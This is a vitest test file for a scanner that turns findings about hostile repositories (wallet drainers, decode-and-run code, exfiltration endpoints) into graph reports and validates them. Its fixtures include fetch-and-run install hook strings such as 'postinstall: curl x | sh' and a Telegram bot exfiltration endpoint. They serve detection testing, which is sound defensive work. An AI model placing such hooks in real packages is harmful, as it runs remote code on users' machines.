import { describe, expect, test } from 'vitest';
import { buildGraphReport, packageId, validateGraphReport, walletId, type GraphReport } from '../../src/report/graphReport';
import type { Finding } from '../../src/engine/types';
import { f } from '../engine/helpers';

const ADDR = '0x9f00000000000000000000000000000000000001';
const UNISWAP = '0x7a250d5630b4cf539739df2c5dacb4c659f2488d';
const decodeExec = (over: Partial<Finding> = {}): Finding => ({
  ...f('critical', 'source.decode-exec-secret'),
  layer: 'repo-file',
  title: 'Code decodes hidden text, runs it, and reads a secret location',
  evidence: `Signals: eval, base64-exec, secret-path-read; wallets: ${ADDR}; endpoints: https://api.telegram.org/bot123456`,
  location: { file: 'scripts/.cache/setup.js', line: 3 },
  ...over,
});
const ROOT = { name: 'interview-task', version: '1.0.0', root: true };
const build = (findings: Finding[], pkg: typeof ROOT | null = ROOT) =>
  buildGraphReport({ owner: 'octo', repo: 'hostile', findings, packageFor: () => pkg ?? undefined });

describe('ids in the format the API expects', () => {
  test('wallet: chainId:lowercase address; package: purl with a plain @ for scopes', () => {
    expect(walletId('0xABCDEFabcdef0123456789ABCDEFabcdef012345')).toBe('1:0xabcdefabcdef0123456789abcdefabcdef012345');
    expect(walletId(ADDR, 56)).toBe(`56:${ADDR}`);
    expect(packageId('evil-kit', '1.0.0')).toBe('pkg:npm/evil-kit@1.0.0');
    expect(packageId('@scope/name', '1.2.3')).toBe('pkg:npm/@scope/name@1.2.3');
  });
});

describe('buildGraphReport', () => {
  test('the demo: a package with decode-and-run code, a wallet and an exfiltration endpoint', () => {
    const r = build([decodeExec()])!;
    expect(r).toMatchObject({ source: 'vscode', reporter: 'scan-repo' });
    expect(r.nodes).toContainEqual({ type: 'package', id: 'pkg:npm/interview-task@1.0.0', risk: 'critical', category: 'drainer' });
    expect(r.nodes).toContainEqual({ type: 'wallet', id: `1:${ADDR}`, risk: 'critical', category: 'drainer', label: 'address in flagged code' });
    expect(r.nodes).toContainEqual({ type: 'endpoint', id: 'https://api.telegram.org/bot123456', risk: 'high', category: 'exfiltration' });
    expect(r.edges).toContainEqual({ type: 'package_drains_to', fromId: 'pkg:npm/interview-task@1.0.0', toId: `1:${ADDR}` });
    expect(r.edges).toContainEqual({ type: 'package_sends_to', fromId: 'pkg:npm/interview-task@1.0.0', toId: 'https://api.telegram.org/bot123456' });
    expect(r.reason).toMatch(/^[^.]{10,250}\.$/);
    expect(validateGraphReport(r)).toBeUndefined();
  });
  test('a vendored package (not the repo\'s own) also links the repo to it', () => {
    const r = build([decodeExec()], { name: 'fake-lib', version: '2.0.0', root: false })!;
    expect(r.nodes).toContainEqual({ type: 'repo', id: 'github:octo/hostile', risk: 'caution' });
    expect(r.edges).toContainEqual({ type: 'depends_on', fromId: 'github:octo/hostile', toId: 'pkg:npm/fake-lib@2.0.0' });
    expect(validateGraphReport(r)).toBeUndefined();
  });
  test('the repo\'s own root package does not get a depends_on edge to itself', () => {
    expect(build([decodeExec()])!.edges.some((e) => e.type === 'depends_on')).toBe(false);
  });
  test('a malicious install script with no wallet reports just the package', () => {
    const r = build([{ ...f('critical', 'scripts.lifecycle'), evidence: 'postinstall: curl x | sh', location: { file: 'package.json', line: 7 } }])!;
    expect(r.nodes).toEqual([{ type: 'package', id: 'pkg:npm/interview-task@1.0.0', risk: 'critical', category: 'malware' }]);
    expect(r.edges).toEqual([]);
  });
  test('nothing reportable → undefined', () => {
    expect(build([])).toBeUndefined();
    expect(build([f('caution', 'deps.unverified-source')])).toBeUndefined();
    expect(build([f('high', 'settings.shell-override')])).toBeUndefined();
    expect(build([{ ...f('critical', 'tasks.folder-open'), evidence: `x ${ADDR}` }])).toBeUndefined();
  });
  test('a wallet is only accused when the finding is critical and decodes-and-runs: high severity or other rules report no wallet', () => {
    expect(build([decodeExec({ severity: 'high' })])).toBeUndefined();
    const r = build([{ ...f('critical', 'scripts.lifecycle'), evidence: `postinstall: curl ${ADDR} | sh` }])!;
    expect(r.nodes.some((n) => n.type === 'wallet')).toBe(false);
  });
  test('a well-known router in a comment of a flagged file is never reported as a wallet', () => {
    const r = build([decodeExec({ evidence: `Signals: eval, base64-exec, secret-path-read; wallets: ${UNISWAP}` })]);
    expect(r?.nodes.some((n) => n.type === 'wallet')).toBeFalsy();
  });
  test('without a package to attribute the code to, no wallet is reported', () => {
    expect(build([decodeExec()], null)).toBeUndefined();
  });
  test('the bot token never appears in the report', () => {
    const r = build([decodeExec({ evidence: `Signals: x; endpoints: https://api.telegram.org/bot123456:AAH-secret_token/sendMessage` })])!;
    expect(JSON.stringify(r)).not.toContain('AAH-secret');
  });
  test('bounded: at most 5 wallets and 5 endpoints per finding, and the whole report stays inside the limits', () => {
    const wallets = Array.from({ length: 12 }, (_, i) => `0x${(i + 1).toString(16).padStart(40, '3')}`).join(' ');
    const eps = Array.from({ length: 12 }, (_, i) => `https://h${i}.bad.example/p`).join(' ');
    const many = Array.from({ length: 30 }, (_, i) => decodeExec({ evidence: `Signals: s; wallets: ${wallets}; endpoints: ${eps}`, location: { file: `a${i}.js`, line: 1 } }));
    const r = build(many)!;
    expect(r.nodes.length).toBeLessThanOrEqual(40);
    expect(r.edges.length).toBeLessThanOrEqual(80);
    expect(validateGraphReport(r)).toBeUndefined();
  });
  test('source and reporter can be set', () => {
    const r = buildGraphReport({ owner: 'o', repo: 'r', findings: [decodeExec()], packageFor: () => ROOT, reporter: 'scan-package', source: 'cli' })!;
    expect(r).toMatchObject({ source: 'cli', reporter: 'scan-package' });
  });
});

describe('validateGraphReport mirrors the API rules', () => {
  const good = (): GraphReport => ({
    source: 'vscode', reporter: 'scan-repo', reason: 'install script sends funds to a drainer',
    nodes: [{ type: 'package', id: 'pkg:npm/evil-kit@1.0.0', risk: 'critical', category: 'drainer' }, { type: 'wallet', id: `1:${ADDR}`, risk: 'critical', category: 'drainer', label: 'drainer payout' }],
    edges: [{ type: 'package_drains_to', fromId: 'pkg:npm/evil-kit@1.0.0', toId: `1:${ADDR}` }],
  });
  test('the example from the API documentation is valid', () => expect(validateGraphReport(good())).toBeUndefined());
  test.each([
    ['an edge to a node that was not sent', (r: GraphReport) => { r.edges[0]!.toId = '1:0x' + 'b'.repeat(40); }],
    ['an edge from a node that was not sent', (r: GraphReport) => { r.edges[0]!.fromId = 'pkg:npm/x@1.0.0'; }],
    ['a wallet id without a chain', (r: GraphReport) => { r.nodes[1]!.id = ADDR; r.edges[0]!.toId = ADDR; }],
    ['an uppercase wallet address', (r: GraphReport) => { r.nodes[1]!.id = '1:0x' + 'A'.repeat(40); r.edges[0]!.toId = r.nodes[1]!.id; }],
    ['a wallet address of the wrong length', (r: GraphReport) => { r.nodes[1]!.id = '1:0x' + 'a'.repeat(39); r.edges[0]!.toId = r.nodes[1]!.id; }],
    ['a package that is not a purl', (r: GraphReport) => { r.nodes[0]!.id = 'evil-kit'; r.edges[0]!.fromId = 'evil-kit'; }],
    ['an unknown risk', (r: GraphReport) => { (r.nodes[0] as { risk: string }).risk = 'severe'; }],
    ['an uppercase category', (r: GraphReport) => { r.nodes[0]!.category = 'Drainer'; }],
    ['a category over 40 characters', (r: GraphReport) => { r.nodes[0]!.category = 'x'.repeat(41); }],
    ['an unknown edge type', (r: GraphReport) => { (r.edges[0] as { type: string }).type = 'owns'; }],
    ['an edge between the wrong kinds of node', (r: GraphReport) => { r.edges[0] = { type: 'package_drains_to', fromId: `1:${ADDR}`, toId: 'pkg:npm/evil-kit@1.0.0' }; }],
    ['a label on a package', (r: GraphReport) => { r.nodes[0]!.label = 'x'; }],
    ['impersonates on a wallet', (r: GraphReport) => { r.nodes[1]!.impersonates = 'metamask'; }],
    ['a txHash on an edge that is not funded', (r: GraphReport) => { r.edges[0]!.txHash = '0x' + 'a'.repeat(64); }],
    ['an endpoint with a query string', (r: GraphReport) => { r.nodes.push({ type: 'endpoint', id: 'https://x.example/p?a=1', risk: 'high' }); }],
    ['more than 40 nodes', (r: GraphReport) => { for (let i = 0; i < 41; i++) r.nodes.push({ type: 'domain', id: `h${i}.example`, risk: 'unknown' }); }],
    ['more than 80 edges', (r: GraphReport) => { for (let i = 0; i < 81; i++) r.edges.push(r.edges[0]!); }],
    ['an empty reason', (r: GraphReport) => { r.reason = ''; }],
    ['an unknown source', (r: GraphReport) => { (r as { source: string }).source = 'web'; }],
  ])('rejects %s', (_n, mutate) => {
    const r = good();
    mutate(r);
    expect(validateGraphReport(r)).toEqual(expect.any(String));
  });
  test('accepts a funded edge with a txHash, a domain with impersonates, and a repo node', () => {
    const r = good();
    r.nodes.push({ type: 'wallet', id: `1:0x${'c'.repeat(40)}`, risk: 'high' }, { type: 'domain', id: 'metamask-verify.io', risk: 'high', impersonates: 'metamask' }, { type: 'repo', id: 'github:octo/hostile', risk: 'caution' });
    r.edges.push({ type: 'funded', fromId: `1:${ADDR}`, toId: `1:0x${'c'.repeat(40)}`, txHash: '0x' + 'a'.repeat(64) });
    expect(validateGraphReport(r)).toBeUndefined();
  });
});
